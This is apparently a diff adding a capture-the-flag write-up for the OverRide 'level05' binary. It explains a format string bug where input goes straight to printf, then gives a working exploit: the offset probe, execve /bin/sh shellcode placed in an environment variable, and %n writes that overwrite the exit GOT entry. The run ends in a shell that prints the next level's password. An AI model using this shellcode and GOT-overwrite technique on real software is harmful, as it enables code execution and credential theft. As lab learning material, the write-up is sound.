@@ -63,6 +63,61 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
+The program is quite simple. It takes an input thansk to `fgets` and transform all capitals letters (from `'A'` to
+`'Z'`) into lowercase letters. Then the buffer is dumped directly into `printf`,  which is _really_, _really_, _really_
+bad.
+
 ## Exploit
 
-Here everything concerning the exploit description.
+Let's start to find the format string offset:
+
+```console
+level05@OverRide:~$ (python -c 'print "aaaa" + " %08x" * 20') | ./level05
+aaaa 00000064 f7fcfac0 f7ec3af9 ffffd6cf ffffd6ce 00000000 ffffffff ffffd754 f7fdb000 61616161 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830level05@OverRide:~$
+```
+
+The offset is 10 (because `aaaa` corresponds to `61616161` in hexadecimal). Then, we are going to use format string
+exploit to re-print the address of the last call of `exit` (`0x08048513 <+207>:    call   0x8048370 <exit@plt>`) into
+the GOT.
+
+First, let's put our shellcode into environment variables:
+
+```console
+level05@OverRide:~$ export SHELLCODE=`python -c 'print "\x90" * 50 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`
+level05@OverRide:~$ env | grep SHELLCODE
+SHELLCODE=��������������������������������������������������j
+                                                             X�Rh//shh/bin��1�̀
+```
+
+Thanks to GDB, we find that `SHELLCODE` address is: `0xffffd884` (it may change).
+
+We have the code we wan't to call. Now let's get the `exit` GOT address we are going to re-print:
+
+```console
+level05@OverRide:~$ objdump -R level05
+
+level05:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+080497c4 R_386_GLOB_DAT    __gmon_start__
+080497f0 R_386_COPY        stdin
+080497d4 R_386_JUMP_SLOT   printf
+080497d8 R_386_JUMP_SLOT   fgets
+080497dc R_386_JUMP_SLOT   __gmon_start__
+080497e0 R_386_JUMP_SLOT   exit
+080497e4 R_386_JUMP_SLOT   __libc_start_main
+```
+
+The `exit` address in the GOT is `0x080497e0`. Finally, we are going to print `0xd884` (decimal `55428`) at `0x080497e0`
+and `0xffff` (decimal `65535`) at `0x080497e2`:
+
+```console
+level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55450x" + "%10$n" + "%10077x" + "%11$n"'; cat) | ./level05
+[...]
+                                   f7fcfac0
+whoami
+level06
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+```
